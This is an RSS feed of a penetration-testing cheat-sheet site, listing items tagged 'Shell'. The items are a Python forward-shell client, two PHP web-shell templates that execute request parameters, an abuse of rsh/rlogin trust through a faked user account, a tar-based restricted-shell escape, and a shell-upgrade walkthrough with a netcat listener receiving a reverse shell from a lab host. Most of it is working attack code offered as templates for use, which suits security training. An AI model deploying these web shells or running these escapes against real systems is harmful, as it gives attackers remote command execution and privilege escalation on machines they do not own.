<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shell on TLDRBins</title>
    <link>https://tldrbins.github.io/@shell/</link>
    <description>Recent content in Shell on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@shell/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Forward Shell</title>
      <link>https://tldrbins.github.io/forward_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forward_shell/</guid>
      <description>Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
    </item>
    <item>
      <title>PHP Command Shell</title>
      <link>https://tldrbins.github.io/php_cmd_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
      <description>Template #1 &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; Template #2 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Command Shell&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { font-family: monospace; margin: 20px; } pre { background: #f4f4f4; padding: 10px; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;GET&amp;#34; action=&amp;#34;&amp;lt;?php echo htmlspecialchars(basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;])); ?&amp;gt;&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;cmd&amp;#34; autofocus&amp;gt; &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Run&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;pre&amp;gt; &amp;lt;?php if (isset($_GET[&amp;#39;cmd&amp;#39;])) { $cmd = trim($_GET[&amp;#39;cmd&amp;#39;]); if (!empty($cmd)) { echo htmlspecialchars(shell_exec($cmd . &amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;), ENT_QUOTES, &amp;#39;UTF-8&amp;#39;); } } ?&amp;gt; &amp;lt;/pre&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; </description>
    </item>
    <item>
      <title>R Services</title>
      <link>https://tldrbins.github.io/r_services/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/r_services/</guid>
      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo adduser --uid &amp;lt;UID&amp;gt; &amp;lt;USER&amp;gt; # Switch user su &amp;lt;USER&amp;gt; 3. Connect # Installation sudo apt install rsh-redone-client # Connect rlogin &amp;lt;TARGET&amp;gt; 4.</description>
    </item>
    <item>
      <title>rbash</title>
      <link>https://tldrbins.github.io/rbash/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbash/</guid>
      <description>Abuse #1: tar to rbash Escape # Before enter rbash echo $PATH # Enter rbash su &amp;lt;USER&amp;gt; - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </description>
    </item>
    <item>
      <title>Upgrade Shell</title>
      <link>https://tldrbins.github.io/upgrade_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/upgrade_shell/</guid>
      <description>Check Installed Binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
    </item>
  </channel>
</rss>
